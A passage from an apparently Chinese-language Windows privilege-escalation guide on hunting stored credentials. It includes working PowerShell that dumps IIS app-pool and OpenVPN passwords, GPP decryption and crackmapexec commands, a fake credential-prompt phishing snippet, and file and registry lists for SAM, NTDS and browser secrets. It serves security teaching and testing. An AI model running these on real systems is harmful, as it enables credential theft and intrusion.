如果 Sticky Notes 使用 SQLite 预写日志（WAL），单独复制 `plum.sqlite` 可能会遗漏近期已提交的便笺。请保留匹配的 `plum.sqlite-wal`，并确保数据库副本一致；如果有 `plum.sqlite-shm`，也一并保留。共享内存索引可以重建，但 WAL 是数据库持久状态的一部分。参见 [SQLite 的 WAL 文档](https://www.sqlite.org/wal.html)。包含账户名或密码的便笺仅是凭据线索：应另行验证账户、访问权限以及密码是否重复使用。加密的密码管理器记录还需要实际的解密密钥和应用专用的解析方式，才能作为更高权限登录凭据的证据。

### AppCmd.exe

**请注意，要从 AppCmd.exe 恢复密码，你需要拥有 Administrator 权限，并在 High Integrity 级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录中。\
如果此文件存在，则可能已配置某些**凭据**，并且可以将其**恢复**。

此代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在。\
安装程序以 **SYSTEM 权限运行**，其中许多程序易受 **DLL Sideloading 攻击（信息来源：** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## 文件和注册表（凭据）

### 支持工具注册表凭据痕迹

某些较旧的远程支持软件安装会在固定的应用程序注册表项下保留与密码相关的值名称。例如，根据[供应商对注册表项的说明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)，在 9 之前的版本中，TeamViewer 的 `SecurityPasswordAES` 表示已配置的静态会话密码。值名称标记只能作为进一步审查的线索：评估该凭据之前，请核实已安装版本、可读取的值数据、格式以及当前身份验证行为。从远程支持密码进一步获取权限更高的 Windows 帐户，还要求密码确实被重复使用，且该帐户已授权。常规枚举输出中不要包含密文和恢复出的密码。

### 受保护工作表的共享电子表格

如果怀疑可读取的共享工作簿中存有帐户数据，应区分**文件加密**与工作表保护或隐藏列。[Microsoft 指出](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)，工作表保护用于控制编辑，并非安全功能；它本身不能证明工作簿内容已加密。仅审查经授权且相关的文件，并避免在大范围枚举时打印疑似秘密。可读取的 `.xlsx` 路径、受保护的工作表或隐藏列本身，均不能证明其中存在凭据，也不能证明任何帐户具有更高权限；请分别核实实际数据和当前帐户权限。

### CI 服务器保留的变更补丁

CI 服务器可能会在其数据目录中保留已提交的源代码变更，即使构建已完成。[TeamCity 文档](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)将 `system/changes` 说明为远程运行变更的存储位置；数据目录可以配置，不一定位于 `ProgramData` 下。可读取的补丁可能保留对凭据文件、加密密钥或同时使用两者的脚本的新增或已删除引用。例如，PowerShell 的 `ConvertTo-SecureString -Key` 工作流需要 AES 密钥以及加密字符串；[Microsoft 文档](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)说明密钥需单独提供。首先仅审查可访问的补丁名称，然后在获得授权的情况下检查相关内容，避免在常规枚举输出中打印秘密。补丁路径、加密值或密钥引用本身，均不能证明凭据有效或可获得更高权限。限制数据目录的 ACL，并避免在构建变更中提交秘密。

### 自定义本地管理员密码轮换

自制的密码轮换工具可能会在本地服务中存储加密的本地管理员密码，同时将其数据存储凭据放在可读取的 `.env` 文件中，或更新程序二进制文件旁边。应一并审查更新程序的计划任务、帐户、配置 ACL、监听器和数据存储权限。即使数据存储仅监听 loopback，本地用户只要持有有效凭据，仍可访问它；但仅通过身份验证并不能证明该用户有权读取相关记录。如果密文旁边可以访问加密种子或密钥材料，应先审查具体的密钥派生方式，再信任该加密。使用 Go 的 [`math/rand`](https://pkg.go.dev/math/rand) 从暴露的种子确定性派生 AES 密钥的方案，不适合保护该密码；Go 文档指出，该软件包不适用于安全敏感的随机数生成。将恢复出的任何密码视为提权途径之前，请确认该密码仍然有效，并且属于本地 Administrators 组中的帐户。计划任务、`.env` 路径或加密数据块本身，均不能证明上述条件成立。常规枚举输出中不要包含密码和密钥材料。

使用 [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) 管理本地管理员密码。其目录或 Entra 支持的存储及访问控制，与自定义本地数据存储不同；[Elasticsearch 角色](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)同样决定通过身份验证的数据存储用户能否读取特定索引。

### Java 服务器插件归档和凭据复用

某些 Java 服务器插件以 JAR 归档形式分发，存放在服务器的 `plugins` 目录中。可读取的自定义插件可能包含内嵌服务凭据的配置或字节码。仅在获得授权时审查归档，并避免在常规枚举输出中包含恢复出的秘密。插件路径本身不能证明其中存在秘密；恢复出的服务密码只有在同时对权限更高的帐户有效时，才可能带来更高权限。检查相关文件 ACL，并将重复使用的凭据替换为独立的秘密。目录布局请参阅 [PaperMC 的插件安装指南](https://docs.papermc.io/paper/adding-plugins/)，归档内容请参阅 [Oracle 的 JAR 文档](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)。

### Openfire 嵌入式数据库凭据

使用嵌入式数据库的 Openfire 安装可能会在 `Openfire\embedded-db` 下保存 `openfire.script`。如果当前帐户能够读取该文件，请一并检查 `OFUSER` 记录和 `passwordKey` 属性。Openfire 的[用户提供程序文档](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)说明，密码可以以明文形式存储，也可以使用保存在该属性中的密钥加密。只有在恢复出的密码对权限更高的身份仍然有效时，它才与提权有关；文件名本身既不能证明具有读取权限，也不能证明凭据被重复使用。该路径只是资产清查线索，因此常规枚举输出中不要包含数据库内容和凭据。

即使使用外部数据库，独立的 `Openfire\conf\openfire.xml` 文件也可能显示管理控制台配置的端口和绑定接口。Openfire 通常将其管理控制台绑定到 loopback；只要监听器正在运行，本地帐户仍可访问该地址。应一并检查实际监听器、经授权的管理员角色、插件上传策略以及 Openfire 服务身份。能够安装插件的管理员可能使插件代码在服务上下文中运行；如果服务以 LocalSystem 身份运行，权限可能很高。帐户密码匹配或配置路径可读本身，不能证明能够访问管理控制台或执行代码。请参阅供应商的[安装和插件管理指南](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)以及[插件上传 API 属性](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)。

### 取证管理服务器配置

Velociraptor 服务器配置文件通常名为 `server.config.yaml`，其中可能包含内部 CA 的 `CA.private_key`。如果权限较低的用户能够读取该密钥，他们可能可以签发 API 客户端证书。这是否会带来更高权限，取决于服务器的用户角色、API 的可达性，以及服务器或目标代理运行时使用的身份。客户端配置包含不同的材料；找到客户端配置并不能证明可以访问服务器 CA。有些部署会将 CA 私钥离线保存，因此可读取的服务器配置中也可能没有签名密钥。

在 Windows 服务器上，检查安装目录中**服务器**配置文件以及受保护备份副本的 ACL。一个可能的位置是 `%ProgramFiles%\VelociraptorServer\server.config.yaml`；如果服务配置的路径不同，则使用该路径。确认当前身份能够读取文件，并确认其中确实存在 `CA.private_key`。避免在日志或枚举输出中打印私钥。供应商的 `config api_client` 工作流会使用 CA 密钥签发客户端证书，但还需要有效的服务器端角色；创建或更改角色可能需要数据存储写入权限或重启服务。即使无法执行这些写入操作，现有的高权限服务器身份也可能提供一条途径。具有执行权限的 API 查询会在相关服务器或代理的上下文中运行，权限可能很高。

使用严格的 ACL 保护服务器配置和备份；在可能的情况下，将 CA 签名密钥离线保存，并限制 API 角色和监听器访问。请参阅 [Velociraptor API 文档](https://docs.velociraptor.app/docs/server_automation/server_api/)和[安全配置指南](https://docs.velociraptor.app/docs/deployment/security/)。

### Putty 凭据

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY 是一个独立的会话管理器。其原生加密存储文件可能位于 `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`，导出的会话备份文件可能命名为 `sessions-backup.dat`，并存储在其他位置。[SolarWinds 的导出指南](https://thwack.solarwinds.com/discussion/comment/115591)说明，导出文件经过密码加密，可能包含会话、密钥、脚本、标签和关联关系；其[支持论坛](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)指出了原生存储文件的位置。首先检查文件权限和路径。找到其中任一文件，并不能得知其密码，也不能证明任何已保存的凭据仍然有效或拥有更高权限。

### PuTTY SSH 主机密钥

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### 注册表中的 SSH keys

SSH 私钥可能存储在注册表项 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此你应该检查其中是否有有用的信息：

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

如果你在该路径下找到任何条目，它很可能是保存的 SSH key。它经过加密，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
有关此技术的更多信息：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

如果 `ssh-agent` 服务未运行，并且你希望它在启动时自动运行，请执行：

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> 这个 technique 看起来已经不再有效。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，然后通过 ssh 登录一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，而且在非对称密钥认证期间，procmon 没有发现使用 `dpapi.dll`。

### 无人值守文件

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM 和 SYSTEM 备份

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

可读取的 Windows Imaging (`.wim`) 备份文件也可能包含离线的 `SAM`、`SECURITY` 和 `SYSTEM` hive。优先检查本地可访问的备份或映像目录，并在提取任何内容之前检查映像的**成员名称**；仅凭 `.wim` 文件名无法证明其中暴露了 hive，而常规的 `install.wim`、`boot.wim` 和恢复映像通常是误导线索。SMB share 是独立的访问路径，只有在该 share 属于范围内时才应检查。请参阅 Microsoft 的 [Windows 映像指南](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) 和 [注册表 hive 文件参考](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)。

### 云凭据

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

以前有一项功能，可以通过组策略首选项 (GPP) 在一组计算机上部署自定义本地管理员帐户。但此方法存在严重的安全缺陷。首先，存储在 SYSVOL 中、以 XML 文件形式保存的组策略对象 (GPO) 可供任何域用户访问。其次，这些 GPP 中的密码使用公开记录的默认密钥通过 AES256 加密，任何经过身份验证的用户都可以解密。这构成了严重风险，可能导致用户获得更高的权限。

为缓解这一风险，开发了一个函数，用于扫描本地缓存的 GPP 文件，查找包含非空 "cpassword" 字段的文件。找到此类文件后，该函数会解密密码并返回一个自定义 PowerShell 对象。该对象包含 GPP 的详细信息及文件位置，有助于识别并修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（早于 Vista）_ 中搜索以下文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**解密 cPassword：**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

使用 crackmapexec 获取密码：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

带有凭据的 web.config 示例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 中的备份归档

直接放在可通过 Web 访问的 webroot 中的旧 ZIP 备份，可能会暴露以前的配置文件和可复用的凭据。在将其视为暴露风险之前，请检查网站配置的物理路径，以及该归档是否确实可通过 HTTP 访问。默认路径 `C:\inetpub\wwwroot` 仅供参考。可以快速在本地列出文件名和大小，而无需打开归档：

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

归档文件的名称并不能证明其中包含秘密，也不能证明恢复出的凭据能够授予更高权限。

### OpenVPN 凭据

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### 日志

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 请求凭据

如果你认为用户可能知道自己的凭据，甚至其他用户的凭据，你可以随时**要求用户输入这些凭据**（请注意，直接向客户**索要**其**凭据**确实**很危险**）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **可能包含凭据的文件名**

一些曾经包含**明文**或 **Base64** 格式**密码**的已知文件。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### 不带 Password Safe 扩展名的文件名列表变体

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 数据库通常使用 `.psafe3` 扩展名。将匹配的文件名视为加密保险库候选项；文件存在并不能证明你可以读取或解锁它，也不能证明你可以使用其中存储的凭据。检查可访问的用户配置文件和已配置的文件共享根目录，确认此类文件的存储位置。

可读取的 KeePass `.kdbx` 文件同样只是加密保险库线索。解锁需要实际的主密码，以及任何已配置的密钥文件或账户验证因素。如果经授权的审查在某条目中发现 LM:NT 哈希对，在考虑使用 [pass-the-hash](../ntlm/README.md#pass-the-hash) 之前，请先验证所指账户，并确认 NT 哈希是否仍然有效且目标的 NTLM 服务是否接受该哈希。保险库条目本身不会授予 Administrator 或 SYSTEM 权限；远程服务访问、账户权限以及任何单独的服务执行步骤也必须具备。清点时应报告保险库路径和可读性，不要输出数据库或其中存储的凭据。

搜索所有拟检查的文件：

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### 不带 Password Safe 扩展的搜索命令变体

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### 回收站中的凭据

还应检查回收站，查找其中的凭据。

检查可访问的回收站条目，查找已删除的备份和配置归档，以及文件名明确提到凭据的文件。有用的 `.7z`、`.zip` 或 `.rar` 备份可能已有数月之久，文件名也可能很普通。Windows 会在 `$I` 记录中存储原始路径和删除时间，并将已删除文件作为配对的 `$R` 条目；打开归档前，请检查元数据以及当前身份是否具有读取权限。可见性取决于卷、用户 SID 和文件权限，因此列表为空并不能证明不存在可恢复的备份。应将归档名称视为待审查的线索，而不是其包含有效密钥的证明。

可访问的已删除 `.pfx` 文件也可能是**代码签名**线索。如果其中包含可访问的私钥，该密钥可以为修改后的 PowerShell 脚本签名；[PowerShell 要求使用带有私钥的代码签名证书](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)，而 [AppLocker 发布者规则会评估签名者身份和规则范围](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。要跨账户执行，当前身份必须能够修改确切的脚本，生效的规则必须接受该脚本生成的签名并适用于目标账户，而且计划任务或其他权限更高的使用方必须实际运行该脚本。仅凭 `.pfx` 文件名、证书主题或可写脚本，无法证明这条链路成立。在打开私钥材料或触发任务前，请先检查元数据、ACL、策略和计划命令。

还应检查可访问的消息客户端配置文件数据库、笔记和收到的文件，寻找凭据线索。BitLocker 恢复密钥导出文件可能以 HTML 或 TXT 格式存储，有时也会放在名称明确的备份归档中。这类材料可能提供对另一个加密数据卷的访问权限，该卷中或许包含较早的备份；只有在获得授权时，才检查该卷和归档。如果备份中包含 `NTDS.dit`，离线恢复域凭据还需要匹配的 `SYSTEM` hive，详见[备份和特权组工作流程](../active-directory-methodology/privileged-groups-and-token-privileges.md)。仅凭文件名和锁定的卷，无法证明其中存在可用的恢复密钥或域备份。

要**恢复密码**，可以使用：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表内部

**其他可能包含凭据的注册表项**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**从注册表中提取 openssh 密钥。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

应检查存储 **Chrome 或 Firefox** 密码的数据库。\
应检查存储 **Chrome、Edge 或 Firefox** 密码的数据库。\
还应检查浏览器的历史记录、书签和收藏夹，其中可能存有一些**密码**。

对于当前用户的常规 Edge **Default** 配置文件，`Login Data` 位于 `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`，而 `Local State` 位于其父级 `User Data` 目录中。[Microsoft 记录了默认配置文件的位置](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)；其他配置文件或 `UserDataDir` 策略可能会更改该位置。文件存在只能说明这里可能有凭据存储：应确认文件可读、适用用户的 DPAPI 上下文或其他获准使用的密钥材料可用，并确认已保存的登录信息是否属于权限更高的账户。仅枚举路径并不需要打开数据库或打印解密后的密码。

对于 Firefox，[Mozilla 说明](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)，配置文件中的 `key4.db` 和 `logins.json` 分别是配对的密钥文件和加密登录信息文件。它们的存在只能作为线索：在确认凭据可用之前，应检查这两个文件是否都可读、是否存在已保存的条目，以及密钥是否受主密码保护。如果找回的凭据属于域账户，应分别检查该账户的有效组控制权限，以及该组的 [LAPS 密码读取或解密权限](../active-directory-methodology/laps.md)；仅凭浏览器残留文件无法证明存在管理员权限提升途径。

用于从浏览器提取密码的工具：

- Mimikatz：`dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 覆盖**

**组件对象模型（COM）**是 Windows 操作系统内置的一项技术，允许不同语言编写的软件组件之间进行**互操作**。每个 COM 组件都通过类 ID（CLSID）**标识**，每个组件则通过一个或多个接口提供功能，这些接口由接口 ID（IID）标识。

COM 类和接口分别在注册表中的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。该注册表由 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 合并而成，结果为 **HKEY\CLASSES\ROOT**。

在此注册表的 CLSID 项下，可以找到子注册表项 **InProcServer32**，其中包含一个指向 **DLL** 的**默认值**，以及一个名为 **ThreadingModel** 的值，其值可以是 **Apartment**（单线程）、**Free**（多线程）、**Both**（单线程或多线程）或 **Neutral**（线程中立）。

